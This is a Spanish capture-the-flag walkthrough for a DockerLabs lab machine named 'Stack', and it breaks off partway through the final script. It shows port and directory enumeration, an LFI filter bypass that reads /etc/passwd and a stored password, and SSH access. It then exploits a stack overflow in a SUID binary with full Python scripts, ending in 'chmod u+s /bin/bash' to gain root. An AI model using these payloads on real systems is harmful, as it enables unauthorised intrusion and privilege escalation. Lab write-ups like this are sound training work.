# Stack DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip stack.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh stack.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 02:27 EST
Nmap scan report for ctf403.hl (172.17.0.2)
Host is up (0.000040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 85:7f:49:c5:89:f6:ce:d2:b3:92:f1:40:de:e0:56:c4 (ECDSA)
|_  256 6d:ed:59:b8:d8:cc:50:54:9d:37:65:58:f5:3f:52:e3 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Web en producci\xC3\xB3n
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
```

Si entramos en la pagina web que tiene subida en el puerto `80` no veremos mucho a simple vista, pero si inspeccionamos el codigo veremos un comentario en el que pone lo siguiente:

```html
<!--Mensaje para Bob: hemos guardado tu contrase�a en /usr/share/bob/password.txt-->
```

Por lo que esto nos servira para mas adelante...

Vamos hacer un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/file.php             (Status: 200) [Size: 0]
/index.html           (Status: 200) [Size: 417]
/javascript           (Status: 403) [Size: 275]
/note.txt             (Status: 200) [Size: 110]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay varias cosas interesantes, si entramos a `note.txt` veremos lo siguiente:

```
Hemos detectado el LFI en el archivo PHP, pero gracias a str_replace() creemos haber tapado la vulnerabilidad
```

Por lo que vemos nos comenta que habia una vulnerabilidad de `LFI`, por lo que veremos si realmente ya no esta, `fuzzeando` probando con diferentes parametros intentando leer el `passwd` de la siguiente forma.

Lo haremos en el apartado de `file.php` ya que es el unico que podria tener esta vulnerabilidad ya que tiene un `PHP`.

## Escalate user bob

### FUZZ

```shell
ffuf -u http://<IP>/file.php?FUZZ=....//....//....//....//etc/passwd -w /usr/share/wordlists/dirb/big.txt -fs 0
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/file.php?FUZZ=....//....//....//....//etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

file                    [Status: 200, Size: 922, Words: 3, Lines: 21, Duration: 1ms]
:: Progress: [20469/20469] :: Job [1/1] :: 56 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Despues de estar un rato probando varias formas de realizar el `LFI` vemos que si hacemos ese `Bypass` podremos ver que funciono con el parametro `file`, por lo que haremos lo siguiente:

```
URL = http://<IP>/file.php?file=....//....//....//....//etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
sshd:x:100:65534::/run/sshd:/usr/sbin/nologin
bob:x:1000:1000::/home/bob:/bin/bash
```

Veremos que obtuvimos el `passwd` de la maquina, pero recordemos que anteriormente la contraseña de `bob` estaba en la siguiente ruta `/usr/share/bob/password.txt` asi que vamos a intentar leerlo:

```
URL = http://<IP>/file.php?file=....//....//....//....//usr/share/bob/password.txt
```

Info:

```
llv6ox3lx300
```

Podremos ver la contraseña de `bob`, por lo que nos conectaremos por `ssh`:

```shell
ssh bob@<IP>
```

Metemos como contraseña `llv6ox3lx300` y veremos que estamos dentro.

## Escalate Privileges

Si vemos los permisos `SUID` que tenemos...

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2127509     16 -rwsr-xr-x   1 root     root        16328 Dec 19 10:22 /opt/command_exec
  2105130    640 -rwsr-xr-x   1 root     root       653888 Jun 22  2024 /usr/lib/openssh/ssh-keysign
  2097658     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
  2097782     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
  2097793     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
  2097845     72 -rwsr-xr-x   1 root     root        72000 Oct 18 12:56 /usr/bin/su
  2097719     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
  2097777     60 -rwsr-xr-x   1 root     root        59704 Oct 18 12:56 /usr/bin/mount
  2097869     36 -rwsr-xr-x   1 root     root        35128 Oct 18 12:56 /usr/bin/umount
  2097652     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
```

Podremos ver uno interesante en el `/opt`:

```
2127509   16 -rwsr-xr-x   1 root  root  16328 Dec 19 10:22 /opt/command_exec
```

Vemos que si ejecutamos el binario:

```shell
./command_exec
```

Info:

```
Escribe la contraseña: bob 
Estás en modo usuario (key = 1234)
key debe valer 0xdead para entrar al modo administrador
```

Veremos que aparentemente no hace nada en especial, pero vamos a ver si es vulnerable a un `Buffer Overflow`:

```shell
./command_exec
```

Info:

```
Escribe la contraseña: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
Estás en modo usuario (key = 63413563)
key debe valer 0xdead para entrar al modo administrador
zsh: segmentation fault  ./command_exec
```

Vemos que nos pone `segmentation fault` por lo que si es vulnerable...

Vamos a pasarnos el archivo a nuestro `host` de la siguiente forma.

```shell
python3 -m http.server
```

> Host

```shell
wget http://<IP>/command_exec
```

Y con esto ya obtendremos el archivo.

## Ingenieria inversa (command\_exec)

### Instalacion de GDB con PEDA/GDB con pwndbg

Lo que primero tendremos que hacer sera lo siguiente:

```shell
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

Y si iniciamos el programa con `GDB` pasandole como parametro el programa, se nos pondra el `gdb-peda`...

```shell
gdb ./command_exec
```

Pero si diera error por las versiones, podremos instalar esta otra herramienta que es mas poderosa:

```shell
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Y si iniciamos `gdb` veremos lo siguiente:

```shell
gdb ./command_exec
```

Info:

```
GNU gdb (Debian 15.2-1) 15.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 176 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $base, $hex2ptr, $bn_sym, $bn_var, $bn_eval, $ida GDB functions (can be used with print/break)
Reading symbols from ./command_exec...
(No debugging symbols found in ./command_exec)
------- tip of the day (disable with set show-tips off) -------
GDB's apropos <topic> command displays all registered commands that are related to the given <topic>
pwndbg> 
```

### Comprobacion de desbordamiento de Buffer

En el `host`, generamos una cadena de caracteres diseñada para intentar desbordar el `buffer` de la aplicación. Esto se logra con la herramienta `pattern_create.rb`:

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

Info:

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Este patrón se usará como entrada en la aplicación para identificar cómo se maneja el `buffer`.

Ahora llendonos al `GDB` tendremos que ejecutar `run` y meter lo que hemos generado de `400` caracteres, por lo que petara y veremos algo asi:

```
Starting program: /home/kali/Desktop/stack/command_exec 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Escribe la contraseña: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
Estás en modo usuario (key = 63413563)
key debe valer 0xdead para entrar al modo administrador

Program received signal SIGSEGV, Segmentation fault.
0x000055bd7d352288 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 RAX  0
 RBX  0x7ffd723149d8 ◂— 'Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A'
 RCX  0x7f6f0f686210 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7f6f0f76b710 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x55bd7d6242a0 ◂— 'key debe valer 0xdead para entrar al modo administrador\n'
 R8   0
 R9   0xfffffff8
 R10  3
 R11  0x202
 R12  0
 R13  0x7ffd723149e8 ◂— 'm5Am6Am7Am8Am9An0An1An2A'
 R14  0x7f6f0f7c8000 (_rtld_global) —▸ 0x7f6f0f7c92e0 —▸ 0x55bd7d351000 ◂— 0x10102464c457f
 R15  0x55bd7d354dd8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55bd7d352150 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x4138634137634136 ('6Ac7Ac8A')
 RSP  0x7ffd723148c8 ◂— 0x3164413064413963 ('c9Ad0Ad1')
 RIP  0x55bd7d352288 (main+239) ◂— ret 
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
 ► 0x55bd7d352288 <main+239>    ret                                <0x3164413064413963>
    ↓









──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffd723148c8 ◂— 0x3164413064413963 ('c9Ad0Ad1')
01:0008│     0x7ffd723148d0 ◂— 0x6441336441326441 ('Ad2Ad3Ad')
02:0010│     0x7ffd723148d8 ◂— 0x4136644135644134 ('4Ad5Ad6A')
03:0018│     0x7ffd723148e0 ◂— 0x3964413864413764 ('d7Ad8Ad9')
04:0020│     0x7ffd723148e8 ◂— 0x6541316541306541 ('Ae0Ae1Ae')
05:0028│     0x7ffd723148f0 ◂— 0x4134654133654132 ('2Ae3Ae4A')
06:0030│     0x7ffd723148f8 ◂— 0x3765413665413565 ('e5Ae6Ae7')
07:0038│     0x7ffd72314900 ◂— 0x6641396541386541 ('Ae8Ae9Af')
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0   0x55bd7d352288 main+239
   1 0x3164413064413963 None
   2 0x6441336441326441 None
   3 0x4136644135644134 None
   4 0x3964413864413764 None
   5 0x6541316541306541 None
   6 0x4134654133654132 None
   7 0x3765413665413565 None
─────────────────────────────────────────────────────────────────────────────────
```

Vemos esta parte de aqui:

```
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
 ► 0x55bd7d352288 <main+239>    ret                                <0x3164413064413963>
```

Que es la parte que nos interesa, ya que se muestra la direccion de memoria al cual le vamos a encontrar el `offset` de la siguiente forma:

### Identificación del Offset

Para determinar el desplazamiento exacto (`offset`) donde ocurre la `sobrescritura`, usamos `pattern_offset.rb`, proporcionando la dirección en hexadecimal obtenida del `RIP`:

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x3164413064413963
```

Info:

```
[*] Exact match at offset 88
```

Esto indica que el `offset` es de `88` bytes.

> NOTA:

En una arquitectura de 64 bits, no existe el registro `EIP` como en las arquitecturas de 32 bits. En su lugar, se utiliza el registro `RIP`, que almacena la dirección de la próxima instrucción a ejecutar. Sin embargo, esto no significa que `RIP` contenga directamente el valor que estamos sobreescribiendo en un desbordamiento de buffer.

Por ello, debemos buscar el valor en el stack que representa la dirección de retorno (`ret`), que es el objetivo del desbordamiento. En este caso, ese valor es `0x3164413064413963`, el cual proviene de nuestra entrada controlada y será el punto que debemos sobreescribir para desviar el flujo de ejecución.

Vamos a crear un pequeño script que nos automatice todo esto de crear caracteres:

> overflowCreate.py

```python
import argparse

def generate_pattern(buffer_length, offset_length=0, rest_length=0):
    """
    Genera una cadena en la que:
    - Los caracteres del buffer se rellenan con 'A'.
    - El segmento del offset se llena con 'B'.
    - El resto se llena con 'C'.
    
    Args:
        buffer_length (int): Longitud del segmento del buffer (relleno con 'A').
        offset_length (int): Longitud del segmento del offset (relleno con 'B').
        rest_length (int): Longitud del segmento del resto (relleno con 'C').
        
    Returns:
        str: Cadena generada.
    """
    buffer_segment = 'A' * buffer_length
    offset_segment = 'B' * offset_length
    rest_segment = 'C' * rest_length
    return buffer_segment + offset_segment + rest_segment

def main():
    parser = argparse.ArgumentParser(description="Generador de patrones para buffer overflow.")
    parser.add_argument('-b', '--buffer', type=int, required=True, help="Tamaño del segmento para desbordar el buffer (relleno con 'A').")
    parser.add_argument('-o', '--offset', type=int, default=0, help="Tamaño del segmento del offset (relleno con 'B').")
    parser.add_argument('-p', '--padding', type=int, default=0, help="Tamaño del segmento restante (relleno con 'C').")
    
    args = parser.parse_args()
    
    # Validar que `-o` y `-p` dependen de `-b`
    if args.offset and not args.buffer:
        print("Error: El argumento '-o' depende de '-b'. Usa '-b' para especificar el buffer primero.")
        return
    if args.padding and not (args.buffer and args.offset):
        print("Error: El argumento '-p' depende de '-b' y '-o'. Usa ambos antes de '-p'.")
        return
    
    # Generar patrón
    pattern = generate_pattern(args.buffer, args.offset, args.padding)
    print("\n=== Patrón Generado ===")
    print(pattern)

if __name__ == "__main__":
    main()
```

Por lo que vamos a crear lo siguiente:

```shell
python3 overflowCreate.py -b 88 -o 4
```

Info:

```
=== Patrón Generado ===
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

Y ahora ese patron se lo vamos a insertar en el `GDB` de la aplicacion, ejecutando `run`, si pegamos todo esto, veremos lo siguiente:

```
Starting program: /home/kali/Desktop/stack/command_exec 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Escribe la contraseña: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Estás en modo usuario (key = 41414141)
key debe valer 0xdead para entrar al modo administrador

Program received signal SIGSEGV, Segmentation fault.
0x00007f0042424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
 RAX  0
 RBX  0x7fffae0717c8 —▸ 0x7fffae0734eb ◂— '/home/kali/Desktop/stack/command_exec'
 RCX  0x7f6f791c2210 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7f6f792a7710 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x5557c9fdb2a0 ◂— 'key debe valer 0xdead para entrar al modo administrador\n'
 R8   0
 R9   0xfffffff8
 R10  3
 R11  0x202
 R12  0
 R13  0x7fffae0717d8 —▸ 0x7fffae073511 ◂— 'COLORTERM=truecolor'
 R14  0x7f6f79304000 (_rtld_global) —▸ 0x7f6f793052e0 —▸ 0x5557c91e5000 ◂— 0x10102464c457f
 R15  0x5557c91e8dd8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5557c91e6150 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7fffae0716c0 —▸ 0x7fffae0717b0 —▸ 0x7fffae0717b8 ◂— 0x38 /* '8' */
 RIP  0x7f0042424242
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
Invalid address 0x7f0042424242










──────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffae0716c0 —▸ 0x7fffae0717b0 —▸ 0x7fffae0717b8 ◂— 0x38 /* '8' */
01:0008│     0x7fffae0716c8 —▸ 0x5557c91e6199 (main) ◂— push rbp
02:0010│     0x7fffae0716d0 ◂— 0x1c91e5040
03:0018│     0x7fffae0716d8 —▸ 0x7fffae0717c8 —▸ 0x7fffae0734eb ◂— '/home/kali/Desktop/stack/command_exec'
04:0020│     0x7fffae0716e0 —▸ 0x7fffae0717c8 —▸ 0x7fffae0734eb ◂— '/home/kali/Desktop/stack/command_exec'
05:0028│     0x7fffae0716e8 ◂— 0x6a5a41847d871441
06:0030│     0x7fffae0716f0 ◂— 0
07:0038│     0x7fffae0716f8 —▸ 0x7fffae0717d8 —▸ 0x7fffae073511 ◂— 'COLORTERM=truecolor'
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► 0   0x7f0042424242 None
   1   0x7fffae0717b0 None
   2   0x5557c91e6199 main
   3      0x1c91e5040 None
   4   0x7fffae0717c8 None
   5   0x7fffae0717c8 None
   6 0x6a5a41847d871441 None
   7              0x0 None
───────────────────────────────────────────────────────────────────────────────
```

Vemos que esta escribiendo bien el `RIP` con las `B` que hemos metido que se representan en `hexadecimal` con el `42424242` y las `A` con el `4141414141414141`, por lo que se esta escribiendo todo correctamente.

Pero para verlo mejor y ser mas certeros, vamos a realizarlo de forma manual de la siguiente forma.

Vamos a investigar donde se llena de `B(42)` la `key` que nos dice el binario.

```shell
python2 -c 'print b"A"*76 + b"B"*8' | ./command_exec
```

Info:

```
Escribe la contraseña: Estás en modo usuario (key = 42424242)
key debe valer 0xdead para entrar al modo administrador
```

Vemos que la `key` se esta llenando de `B(42)` despues de los `76` caracteres, por lo que hemos encontrado el `offset` real, ahora vamos a crearnos un mini script, para automatizar todo esto...

### Rellenando la key con `dead`

Sabiendo que la direccion de memoria es `0xdead` la que tiene que rellenar la `key`, podremos crear el siguiente script, para ver si se rellena bien:

> exploit.py

```python
#!/bin/python3

import subprocess

# 1. Offset para alcanzar la ubicación de la variable 'key' en la pila
# Este valor debe ser ajustado para coincidir con la cantidad de bytes que debemos sobrescribir
# antes de llegar a la variable 'key' o la dirección que queremos manipular.
offset = 76

# 2. Crear la parte del RIP (Return Instruction Pointer), utilizando 'A' para llenar la memoria.
# El RIP es el puntero de retorno en la pila, que en el caso de un desbordamiento de buffer puede
# sobrescribirse, permitiéndonos manipular la ejecución del programa.
# En este caso, 'A' es solo un carácter de relleno para alcanzar el valor deseado.
RIP = b"A" * offset

# 3. Representación de 0xdead en dos bytes: 0xad y 0xde.
# Queremos sobrescribir la variable 'key' con el valor 0xdead. Este valor se representa en hexadecimal
# como dos bytes: 0xad (más bajo) y 0xde (más alto).
dead = b"\xad\xde"

# 4. Crear el payload final, que consiste en:
# - RIP: Llenamos con 'A' hasta llegar a la posición de la variable 'key'
# - dead: Sobrescribimos 'key' con 0xdead
payload = RIP + dead

# 5. Nombre del binario que vamos a ejecutar
# En este caso, es un binario llamado 'command_exec' que se encuentra en el directorio /opt y lo ejecuta directamente
program = ["/opt/command_exec"]

# 6. Ejecutar el binario con un proceso hijo utilizando Popen.
# Utilizamos stdin=subprocess.PIPE para poder enviar datos (el payload) al binario de forma controlada.
process = subprocess.Popen(
    program, stdin=subprocess.PIPE
)

# 7. Enviar el payload al programa a través de stdin.
# El primer payload sobrescribe la ubicación de la 'key' con el valor 0xdead.
process.stdin.write(payload + b"\n")
process.stdin.flush()  # Aseguramos que el payload se envíe correctamente.

# 8. Esperamos a que termine el proceso.
# Esto asegura que el binario termine su ejecución antes de finalizar el script.
process.wait()
```

Si lo ejecutamos vemos lo siguiente:

```shell
python3 exploit.py
```

Info:

```shell
Escribe la contraseña: Estás en modo administrador (key = dead)
Escribe un comando:
```

Por lo que vemos funciona correctamente, por lo que ahora vamos automatizar el que envie un comando tambien de la siguiente forma:

> exploit.py

```python
#!/bin/python3

import subprocess

# 1. Offset para alcanzar la ubicación de la variable 'key' en la pila
# Este valor debe ser ajustado para coincidir con la cantidad de bytes que debemos sobrescribir
# antes de llegar a la variable 'key' o la dirección que queremos manipular.
offset = 76

# 2. Crear la parte del RIP (Return Instruction Pointer), utilizando 'A' para llenar la memoria.
# El RIP es el puntero de retorno en la pila, que en el caso de un desbordamiento de buffer puede
# sobrescribirse, permitiéndonos manipular la ejecución del programa.
# En este caso, 'A' es solo un carácter de relleno para alcanzar el valor deseado.
RIP = b"A" * offset

# 3. Representación de 0xdead en dos bytes: 0xad y 0xde.
# Queremos sobrescribir la variable 'key' con el valor 0xdead. Este valor se representa en hexadecimal
# como dos bytes: 0xad (más bajo) y 0xde (más alto).
dead = b"\xad\xde"

# 4. Comando adicional que se ejecutará al sobrescribir la 'key'.
# El comando 'id' para ver que usuario somos o bajo el que se esta ejecutando
command = b"id"

# 5. Crear el payload final, que consiste en:
# - RIP: Llenamos con 'A' hasta llegar a la posición de la variable 'key'
# - dead: Sobrescribimos 'key' con 0xdead
payload = RIP + dead

# 6. Nombre del binario que vamos a ejecutar
# En este caso, es un binario llamado 'command_exec' que se encuentra en el directorio /opt y lo ejecuta directamente
program = ["/opt/command_exec"]

# 7. Ejecutar el binario con un proceso hijo utilizando Popen.
# Utilizamos stdin=subprocess.PIPE para poder enviar datos (el payload) al binario de forma controlada.
process = subprocess.Popen(
    program, stdin=subprocess.PIPE
)

# 8. Enviar el payload al programa a través de stdin.
# El primer payload sobrescribe la ubicación de la 'key' con el valor 0xdead.
process.stdin.write(payload + b"\n")
process.stdin.flush()  # Aseguramos que el payload se envíe correctamente.

# 9. Ahora que hemos sobrescrito la 'key', enviamos el comando adicional que se ejecutará,
# en este caso, 'id' para ver que usuario somos o bajo el que se esta ejecutando
process.stdin.write(command + b"\n")
process.stdin.flush()

# 10. Esperamos a que termine el proceso.
# Esto asegura que el binario termine su ejecución antes de finalizar el script.
process.wait()
```

Si lo ejecutamos vemos lo siguiente:

```shell
python3 exploit.py
```

Info:

```shell
Escribe la contraseña: Estás en modo administrador (key = dead)
Escribe un comando: uid=0(root) gid=0(root) groups=0(root)
```

### Ejecución de comando

Vemos que se esta ejecutando como `root` ya que el binario esta con permisos `SUID` por lo que vamos hacer lo siguiente para ser `root`:

> exploit.py

```python
#!/bin/python3

import subprocess

# 1. Offset para alcanzar la ubicación de la variable 'key' en la pila
# Este valor debe ser ajustado para coincidir con la cantidad de bytes que debemos sobrescribir
# antes de llegar a la variable 'key' o la dirección que queremos manipular.
offset = 76

# 2. Crear la parte del RIP (Return Instruction Pointer), utilizando 'A' para llenar la memoria.
# El RIP es el puntero de retorno en la pila, que en el caso de un desbordamiento de buffer puede
# sobrescribirse, permitiéndonos manipular la ejecución del programa.
# En este caso, 'A' es solo un carácter de relleno para alcanzar el valor deseado.
RIP = b"A" * offset

# 3. Representación de 0xdead en dos bytes: 0xad y 0xde.
# Queremos sobrescribir la variable 'key' con el valor 0xdead. Este valor se representa en hexadecimal
# como dos bytes: 0xad (más bajo) y 0xde (más alto).
dead = b"\xad\xde"

# 4. Comando adicional que se ejecutará al sobrescribir la 'key'.
# El comando 'chmod u+s /bin/bash' cambia los permisos de 'bash' para permitir que sea ejecutado
# con privilegios de usuario 'root' (SUID).
# Esto puede ser utilizado para obtener acceso de root al ejecutar el binario modificado.
command = b"chmod u+s /bin/bash"

# 5. Crear el payload final, que consiste en:
# - RIP: Llenamos con 'A' hasta llegar a la posición de la variable 'key'
